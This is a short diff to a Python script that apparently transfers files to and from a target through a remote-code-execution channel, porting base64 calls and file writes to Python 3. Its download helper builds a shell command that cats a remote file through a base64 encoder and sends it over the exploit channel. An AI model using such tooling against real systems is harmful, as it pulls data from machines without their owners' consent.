@@ -17,10 +17,10 @@ from __future__ import print_function
 # If you omit the remote_path it uploads the file on the current working folder.
 #
 # To download a file: DOWNLOAD remote_path
-# e.g. $ DOWNLOAD \temp\myfile.txt
+# e.g. $ DOWNLOAD /temp/myfile.txt
 
 
-import os 
+import os
 import re
 import sys
 import uuid
@@ -113,7 +113,7 @@ def download(rce, remote_path):
     remote_md5sum = response.strip()[:32]
     cmd = "cat '" + remote_path + "' | " + find_tool("b64enc")
     b64content = send_command(cmd, rce, enclose=True)
-    content = base64.decodestring(b64content)
+    content = base64.b64decode(b64content)
     local_md5sum = hashlib.md5(content).hexdigest()
     print("Remote md5sum: " + remote_md5sum)
     print(" Local md5sum: " + local_md5sum)
@@ -121,7 +121,7 @@ def download(rce, remote_path):
         print("               MD5 hashes match!")
     else:
         print("               ERROR! MD5 hashes do NOT match!")
-    with open(os.path.basename(remote_path), "w") as f:
+    with open(os.path.basename(remote_path), "wb") as f:
         f.write(content)
 
 
@@ -136,7 +136,7 @@ def upload(rce, local_path, remote_path):
     with open(local_path, 'rb') as f:
         data = f.read()
         md5sum = hashlib.md5(data).hexdigest()
-        b64enc_data = "".join(base64.encodestring(data).split())
+        b64enc_data = base64.b64encode(data).decode('ascii')
    
     print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
     for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
